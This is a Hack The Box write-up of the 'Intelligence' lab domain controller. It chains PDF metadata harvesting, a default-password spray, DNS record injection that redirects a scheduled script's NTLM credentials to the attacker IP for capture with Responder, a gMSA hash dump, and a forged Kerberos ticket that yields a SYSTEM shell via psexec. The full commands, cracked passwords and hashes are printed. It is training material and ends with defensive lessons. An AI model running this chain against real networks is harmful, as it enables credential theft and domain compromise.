---
title: 'Intelligence'
target: 'Hack The Box — Intelligence'
difficulty: 'medium'
date: 2026-01-05
summary: 'An HTB AD domain controller — PDF metadata enumeration for usernames, default password spray for initial access, DNS record injection to capture NTLM hashes via a scheduled script, gMSA password dump, and Silver Ticket impersonation for SYSTEM.'
role: 'pentest'
tags: ['nmap', 'active-directory', 'domain-controller', 'iis', 'pdf', 'metadata', 'exiftool', 'kerbrute', 'password-spray', 'crackmapexec', 'smb', 'bloodhound', 'dns', 'dnstool', 'responder', 'ntlmv2', 'john', 'hash-cracking', 'gmsa', 'gmsadumper', 'silver-ticket', 'impacket', 'kerberos', 'psexec', 'privilege-escalation', 'windows']
problem: 'AD domain controller with IIS hosting PDFs in a predictable date-based naming scheme containing valid usernames in metadata and a default password. A scheduled script checks DNS "web*" entries with default credentials, enabling NTLM capture via DNS injection. The ITSupport group has ReadGMSAPassword on a service account whose hash enables Silver Ticket impersonation.'
action: 'Nmap revealed a full AD domain controller. Fuzzed date-based PDF URLs under /documents/ to find 84 files, extracted creator metadata with exiftool for a username wordlist, and found a default password (NewIntelligenceCorpUser9876) in one PDF. Password sprayed with crackmapexec — worked for Tiffany.Molina. Enumerated SMB shares and found downdetector.ps1 in the IT share, which queries DNS "web*" entries with -UseDefaultCredentials. BloodHound identified ITSupport (containing Ted.Graves) with ReadGMSAPassword on svc_int$. Used dnstool.py to inject a DNS record pointing to the attacker IP, captured Ted.Graves''s NTLMv2 hash with Responder, cracked it (Mr.Teddy), dumped the gMSA hash with gMSADumper, and forged a Silver Ticket to impersonate Administrator for SYSTEM via psexec.'
outcome: 'SYSTEM via a five-stage AD chain — PDF metadata for usernames, default password for initial access, DNS injection and NTLM capture for ITSupport credentials, gMSA password dump, and Silver Ticket impersonation of Administrator.'
draft: false
---

## Background

Intelligence is a medium-rated Active Directory machine that builds a long attack chain from information leakage in PDF metadata all the way to domain administrator through a Silver Ticket. What makes this box interesting isn't any single vulnerability — it's how each step unlocks the next in a way that mirrors real Active Directory engagements. PDF metadata gives usernames, a default password in a document gives initial access, a scheduled script gives a path to NTLM capture, group membership gives gMSA password access, and the gMSA hash gives a Silver Ticket. Each link requires understanding a different AD concept, and the chain doesn't work if you skip any of them.

---

## Enumeration

Adding `intelligence.htb` to `/etc/hosts` and running an **nmap** scan with service version detection and default scripts:

```
nmap -sC -sV -o nmap/intelligence.nmap 10.10.10.248
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
                              (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
```

A full **Active Directory domain controller** — DNS, Kerberos, LDAP, Global Catalog, SMB, and IIS on port 80. The LDAP SSL certificate reveals the hostname **dc.intelligence.htb**, which also gets added to `/etc/hosts`. The clock skew of +7h00m01s from the scanner time is worth noting for later Kerberos operations, which are sensitive to time synchronization.

---

## PDF enumeration — metadata and default credentials

The web service on port 80 is a custom website with no interactive functionality, but it hosts two PDF files at `/documents/2020-01-01-upload.pdf` and `/documents/2020-12-15-upload.pdf`. The date-based naming scheme and the eleven-month gap between them suggests more files exist between those dates. Generating a wordlist of every possible date in 2020 and fuzzing for valid documents:

```
for month in {01..12}; do for day in {01..31}; do echo 2020-$month-$day-upload.pdf; done; done > pdf.list
wfuzz -u http://10.10.10.248/documents/FUZZ -w pdf.list --hc 404
```

The fuzzing discovers **84 PDF files** across the year. Downloading all of them and extracting the creator metadata with **exiftool** builds a wordlist of domain usernames — each PDF was created by a different user, and the creator field contains their full username:

```
for i in $(cat pdf.list); do wget http://10.10.10.248/documents/$i; done
exiftool *.pdf | grep Creator | awk '{print $3}' > usernames.list
```

Validating the extracted usernames against the domain controller with **Kerbrute** confirms every single one is a valid domain account:

```
./kerbrute userenum --dc 10.10.10.248 -d intelligence.htb usernames.list
```

With a list of valid usernames, the next step is finding a password. Converting all 84 PDFs to text and searching for sensitive content:

```
for i in $(ls *.pdf); do pdftotext $i; done
cat *.txt | grep -iR password
```

The file `2020-06-04-upload.pdf` contains a **New Account Guide** with the default password in plaintext:

```
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

Password spraying the default credential against all discovered usernames with **crackmapexec**:

```
crackmapexec smb 10.10.10.248 -u usernames.list -p 'NewIntelligenceCorpUser9876' --continue-on-success
```

One user never changed the default password — **Tiffany.Molina** authenticates successfully. Initial domain access established.

---

## SMB — the downdetector script

Enumerating SMB shares with Tiffany.Molina's credentials:

```
crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares
```

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
IT              READ
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
Users           READ
```

The **IT** share stands out — not a default share, and readable with a standard domain user. Connecting with smbclient reveals a single file:

```
smbclient -U Tiffany.Molina //10.10.10.248/IT
smb: \> dir
  downdetector.ps1    A    1046    Mon Apr 19 02:50:55 2021
smb: \> get downdetector.ps1
```

The contents of `downdetector.ps1`:

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory

foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*") {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

This script is the key to the next phase. It runs every 5 minutes, queries the Active Directory DNS zone for all records starting with **"web"**, and makes HTTP requests to each one using **`-UseDefaultCredentials`** — which means it sends the running account's NTLM credentials with every request. The script emails **Ted.Graves** when a host is down, confirming Ted is associated with IT operations.

The attack path is clear: any domain user can create DNS records in Active Directory. By adding a record starting with "web" that points to the attacker's IP, the scheduled script will send its NTLM credentials directly to the attacker.

---

## BloodHound — mapping the domain

Before exploiting the script, mapping the full domain with **BloodHound** to understand where the attack chain leads:

```
bloodhound-python -ns 10.10.10.248 -d intelligence.htb -dc dc.intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -c All
```

BloodHound throws a warning about `svc_int.intelligence.htb` being unresolvable — a service account that exists in AD but doesn't have a DNS entry. Importing the collected data into BloodHound and analyzing the shortest path to SVC_INT reveals the full privilege escalation map:

![BloodHound graph showing the attack path to SVC_INT@INTELLIGENCE.HTB. At the top, ADMINISTRATOR@INTELLIGENCE.HTB is a MemberOf DOMAIN ADMINS@INTELLIGENCE.HTB, which has AllExtendedRights to SVC_INT. ACCOUNT OPERATORS has Owns, ENTERPRISE ADMINS has GenericAll, KEY ADMINS has GenericAll, ENTERPRISE KEY ADMINS has AddKeyCredentialLink — all pointing to SVC_INT. Critically, ITSUPPORT@INTELLIGENCE.HTB has ReadGMSAPassword to SVC_INT. Two users are MemberOf ITSUPPORT — TED.GRAVES@INTELLIGENCE.HTB and LAURA.LEE@INTELLIGENCE.HTB. At the bottom, DC.INTELLIGENCE.HTB also has ReadGMSAPassword, and ADMINISTRATORS@INTELLIGENCE.HTB is shown. SVC_INT has AllExtendedRights back toward DC.INTELLIGENCE.HTB.](/writeups/htb-intelligence/01-bloodhound.png)

**SVC_INT** is a **Group Managed Service Account (gMSA)** — a special AD object type where the password is automatically managed and rotated by domain controllers. The critical relationship is **ReadGMSAPassword** from the **ITSupport** group, which contains **Ted.Graves** and **Laura.Lee**. If either user's credentials are obtained, the gMSA password hash can be extracted. And SVC_INT itself has **AllExtendedRights** on the domain controller, which opens the door to a Silver Ticket attack.

The chain is now mapped: Tiffany.Molina → DNS injection → capture Ted.Graves's hash → ReadGMSAPassword on SVC_INT → Silver Ticket → Administrator.

---

## DNS injection and NTLM capture

Creating a DNS record that the downdetector script will pick up, using **dnstool.py** from the Krbrelayx toolkit:

```
python3 krbrelayx/dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -r webtest.intelligence.htb -a add -t A -d 10.10.14.7 10.10.10.248
```

The record `webtest.intelligence.htb` starts with "web" and points to the attacker's IP. When the scheduled script runs, it will query DNS, find this new record, and make an HTTP request to the attacker with the service account's NTLM credentials. Starting **Responder** to capture the authentication:

```
responder -I tun0
```

Within five minutes, the script executes and sends an HTTP request to the attacker's IP. Responder intercepts the NTLM authentication exchange:

```
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:69c91fe390291bb1(...)
```

The script runs as **Ted.Graves** — and the `-UseDefaultCredentials` flag sends his NTLMv2 hash with the request. Cracking it with **John the Ripper**:

```
john ted_graves.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The hash cracks to **Mr.Teddy**. Validating with crackmapexec confirms the credentials work:

```
crackmapexec smb 10.10.10.248 -u ted.graves -p 'Mr.Teddy'
```

Ted.Graves is a member of ITSupport, which has ReadGMSAPassword on SVC_INT — the next link in the chain.

---

## gMSA password extraction

With Ted.Graves's credentials and his ITSupport group membership, the gMSA password for SVC_INT can be extracted using **gMSADumper**:

```
python3 /opt/gMSADumper/gMSADumper.py -u 'ted.graves' -p 'Mr.Teddy' -d intelligence.htb
```

```
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::4b18bc2b883607c026d27bf526bcb3d4
```

The gMSA NTLM hash **4b18bc2b883607c026d27bf526bcb3d4** is extracted. Unlike a normal user password, gMSA passwords are 256-byte randomly generated values that rotate automatically — they can't be cracked, but the hash itself is enough for authentication and ticket forging. Validating with crackmapexec confirms the hash works:

```
crackmapexec smb 10.10.10.248 -u svc_int$ -H 4b18bc2b883607c026d27bf526bcb3d4
```

---

## Silver Ticket — impersonating Administrator

SVC_INT is a service account with a registered SPN (Service Principal Name), which means its hash can be used to forge a **Silver Ticket** — a Kerberos service ticket signed with the service account's key that the domain controller will accept without verification. By impersonating the Administrator in the forged ticket, full domain admin access is achieved.

First, synchronizing the local clock with the domain controller — Kerberos tickets are time-sensitive and will be rejected if the clock skew exceeds five minutes:

```
ntpdate 10.10.10.248
```

Generating the Silver Ticket with **impacket-getST**, targeting the WWW service on the domain controller and impersonating the Administrator:

```
impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes 4b18bc2b883607c026d27bf526bcb3d4:4b18bc2b883607c026d27bf526bcb3d4
```

Exporting the ticket and using it for authentication:

```
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass intelligence.htb/Administrator@dc.intelligence.htb
```

**SYSTEM** — psexec connects with the forged Kerberos ticket and provides a SYSTEM shell on the domain controller. Both flags were retrieved.

---

## What I took from this

Intelligence builds a chain that touches almost every major Active Directory attack concept — and each step teaches something about how AD environments leak information and trust relationships cascade into full compromise.

The PDF metadata enumeration is a technique that translates directly to real engagements. Organizations publish documents on their websites, intranets, and file shares without realizing that office document metadata contains author names, internal usernames, software versions, and sometimes file paths that reveal internal infrastructure. Tools like exiftool and FOCA automate this extraction at scale, and the usernames recovered are immediately useful for password spraying, Kerberos enumeration, and social engineering. The defense is metadata scrubbing before publication — most document management systems support this, but it's rarely enabled by default.

The DNS injection attack exploits a fundamental AD design decision: by default, any authenticated domain user can create DNS records in the Active Directory-integrated DNS zones. The downdetector script amplifies this into credential theft because it uses `-UseDefaultCredentials` — sending NTLM authentication to whatever hostname it resolves. The combination of "any user can create DNS records" and "a scheduled script authenticates to DNS-resolved hosts" creates a relay path that's invisible until someone reads the script. The fixes are independent: restrict DNS record creation through security descriptor modifications on the DNS zone, and don't use `-UseDefaultCredentials` for health checks against untrusted hostnames.

The gMSA to Silver Ticket escalation demonstrates why ReadGMSAPassword is a high-value permission that should be tightly controlled. Group Managed Service Accounts are designed to be more secure than regular service accounts because their passwords rotate automatically and are never known to humans. But the security model depends entirely on who can read the password — any principal with ReadGMSAPassword effectively owns that service account's identity. When the service account has a registered SPN, its hash can forge Silver Tickets that impersonate any user to any service the account is trusted for. The lesson is that gMSA security is only as strong as the access control on the ReadGMSAPassword permission, and BloodHound makes these trust chains visible in a way that manual enumeration rarely achieves.
